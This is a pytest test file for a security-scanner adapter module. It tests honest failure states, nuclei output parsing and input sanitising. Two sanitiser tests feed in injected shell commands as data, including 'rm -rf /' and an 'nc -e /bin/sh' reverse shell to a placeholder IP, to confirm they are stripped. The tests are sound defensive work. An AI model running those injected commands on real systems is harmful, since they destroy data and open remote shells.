"""Scanner adapter foundation: availability detection, honest state reporting
(NOT_INSTALLED / TIMEOUT / EXECUTION_FAILED / PARSE_FAILED), injection-safe
argument lists, and non-fabricated nuclei parsing."""

import subprocess

from app.tools import scanner_tools
from app.tools.scanner_tools import (
    ADAPTERS,
    NmapAdapter,
    NucleiAdapter,
    ScannerAdapter,
    STATE_EXECUTION_FAILED,
    STATE_NOT_INSTALLED,
    STATE_PARSE_FAILED,
    STATE_TIMEOUT,
    is_tool_installed,
    run_nmap,
    run_nuclei,
    sanitize_input,
)


def test_sanitize_input_strips_shell_metacharacters():
    out = sanitize_input("example.com; rm -rf / && nc -e /bin/sh 1.2.3.4 4444 &")
    assert ";" not in out
    assert "&" not in out
    assert "|" not in out
    assert " " not in out
    assert "example.com" in out


def test_refresh_tool_path_merges_missing_entries_only(monkeypatch):
    monkeypatch.setattr(scanner_tools, "_system_path_entries", lambda: [])
    monkeypatch.setenv("PATH", r"D:\existing")
    monkeypatch.setenv("TOOL_PATH", r"D:\new;D:\existing;E:\more")
    scanner_tools.refresh_tool_path()
    parts = scanner_tools.os.environ["PATH"].split(scanner_tools.os.pathsep)
    assert parts[0] == r"D:\new"
    assert r"D:\existing" in parts
    assert r"E:\more" in parts
    assert parts.count(r"D:\existing") == 1
    assert parts.count(r"D:\new") == 1


def test_refresh_tool_path_is_idempotent(monkeypatch):
    monkeypatch.setattr(scanner_tools, "_system_path_entries", lambda: [])
    monkeypatch.setenv("PATH", r"D:\only")
    monkeypatch.setenv("TOOL_PATH", r"D:\only;D:\only")
    scanner_tools.refresh_tool_path()
    scanner_tools.refresh_tool_path()
    parts = scanner_tools.os.environ["PATH"].split(scanner_tools.os.pathsep)
    assert parts == [r"D:\only"]


def test_not_installed_reported_and_never_faked(monkeypatch):
    monkeypatch.setattr(scanner_tools, "is_tool_installed", lambda binary: False)
    result = run_nmap("example.com", simulation=False)
    assert result["status"] == STATE_NOT_INSTALLED
    assert result["tool"] == "nmap"
    assert "NOT INSTALLED" in result["log"]
    assert "nmap" in result["log"]
    # Absence of the binary must never fabricate ports or findings.
    assert "ports" not in result


def test_available_reflects_which(monkeypatch):
    monkeypatch.setattr(scanner_tools, "is_tool_installed", lambda binary: True)
    assert NmapAdapter().available() is True
    monkeypatch.setattr(scanner_tools, "is_tool_installed", lambda binary: False)
    assert NmapAdapter().available() is False


def test_timeout_mapped_to_timeout_state(monkeypatch):
    monkeypatch.setattr(scanner_tools, "is_tool_installed", lambda binary: True)

    def _stall(cls_self, *args, **kwargs):
        raise subprocess.TimeoutExpired(cmd=args[0], timeout=1)

    monkeypatch.setattr(NmapAdapter, "execute", _stall)
    result = run_nmap("example.com", simulation=False)
    assert result["status"] == STATE_TIMEOUT


def test_called_process_error_mapped_to_execution_failed(monkeypatch):
    monkeypatch.setattr(scanner_tools, "is_tool_installed", lambda binary: True)

    def _boom(cls_self, *args, **kwargs):
        raise subprocess.CalledProcessError(returncode=1, cmd=args[0], stderr="no permission")

    monkeypatch.setattr(NmapAdapter, "execute", _boom)
    result = run_nmap("example.com", simulation=False)
    assert result["status"] == STATE_EXECUTION_FAILED
    assert "no permission" in result["log"]


def test_file_not_found_at_runtime_maps_to_not_installed(monkeypatch):
    monkeypatch.setattr(scanner_tools, "is_tool_installed", lambda binary: True)

    def _missing(cls_self, *args, **kwargs):
        raise FileNotFoundError(args[0][0])

    monkeypatch.setattr(NmapAdapter, "execute", _missing)
    result = run_nmap("example.com", simulation=False)
    assert result["status"] == STATE_NOT_INSTALLED


def test_real_execution_uses_injection_safe_args(monkeypatch):
    captured = {}

    def _fake_execute(cls_self, args, sanitized_arg=True):
        captured["args"] = list(args)
        return subprocess.CompletedProcess(args, 0, stdout="api.example.com\ndev.example.com\n", stderr="")

    monkeypatch.setattr(scanner_tools, "is_tool_installed", lambda binary: True)
    monkeypatch.setattr(scanner_tools.ADAPTERS["subfinder"].__class__, "execute", _fake_execute)

    result = scanner_tools.run_subfinder("example.com; id && nc", simulation=False)
    assert result["status"] == "success"
    assert result["subdomains"] == ["api.example.com", "dev.example.com"]
    assert ";" not in result["log"]
    joined = " ".join(captured["args"])
    assert ";" not in joined
    assert "&" not in joined
    assert all(part in joined for part in ("-d", "example.comidnc"))


def test_registry_contains_all_expected_tools():
    assert set(ADAPTERS.keys()) == {
        "subfinder", "assetfinder", "dnsx", "nmap", "httpx", "gau", "whatweb", "nuclei",
    }


def test_nuclei_parses_honest_json_lines(monkeypatch):
    monkeypatch.setattr(scanner_tools, "is_tool_installed", lambda binary: True)
    line = (
        '{"template-id":"cves/2024/CVE-2024-3849","matcher-name":"generic",'
        '"matched-at":"https://example.com/admin/search",'
        '"info":{"name":"CVE-2024-3849 SQL Injection","severity":"critical",'
        '"description":"SQL injection in search.","remediation":"Use parameters.",'
        '"classification":{"cve-id":["CVE-2024-3849"]}}}'
    )

    def _json_stdout(cls_self, *args, **kwargs):
        return subprocess.CompletedProcess(args[0], 0, stdout=line + "\n", stderr="")

    monkeypatch.setattr(NucleiAdapter, "execute", _json_stdout)
    result = run_nuclei("example.com", simulation=False)
    assert result["status"] == "success"
    assert len(result["vulnerabilities"]) == 1
    v = result["vulnerabilities"][0]
    assert v["cve"] == "CVE-2024-3849"
    assert v["severity"] == "Critical"
    assert "sql injection" in v["description"].lower()
    assert "example.com/admin/search" in v["proof_of_concept"]


def test_nuclei_silent_run_yields_no_findings(monkeypatch):
    monkeypatch.setattr(scanner_tools, "is_tool_installed", lambda binary: True)

    def _empty(cls_self, *args, **kwargs):
        return subprocess.CompletedProcess(args[0], 0, stdout="", stderr="")

    monkeypatch.setattr(NucleiAdapter, "execute", _empty)
    result = run_nuclei("example.com", simulation=False)
    assert result["status"] == "success"
    assert result["vulnerabilities"] == []


def test_nuclei_malformed_output_is_parse_failed_not_fabrication(monkeypatch):
    monkeypatch.setattr(scanner_tools, "is_tool_installed", lambda binary: True)

    def _garbage(cls_self, *args, **kwargs):
        return subprocess.CompletedProcess(args[0], 0, stdout="garbage-not-json\n", stderr="")

    monkeypatch.setattr(NucleiAdapter, "execute", _garbage)
    result = run_nuclei("example.com", simulation=False)
    assert result["status"] == STATE_PARSE_FAILED
    assert "vulnerabilities" not in result


def test_dnsx_not_installed_state():
    # dnsx executes per-subdomain and cannot reuse the generic execute wrapper,
    # but its NOT_INSTALLED path must still be explicit and safe.
    if is_tool_installed("dnsx"):  # pragma: no cover - environment-specific
        return
    result = scanner_tools.run_dnsx("example.com", ["api.example.com"], simulation=False)
    assert result["status"] == STATE_NOT_INSTALLED


def test_simulated_backoff_is_explicit_marker_source():
    # Simulation is the *only* producer of synthetic findings and it requires
    # the explicit flag - adapters never fall back to it implicitly.
    result = scanner_tools.run_whatweb("example.com", simulation=True)
    assert result["status"] == "success"
    assert "React 19" in result["techs"]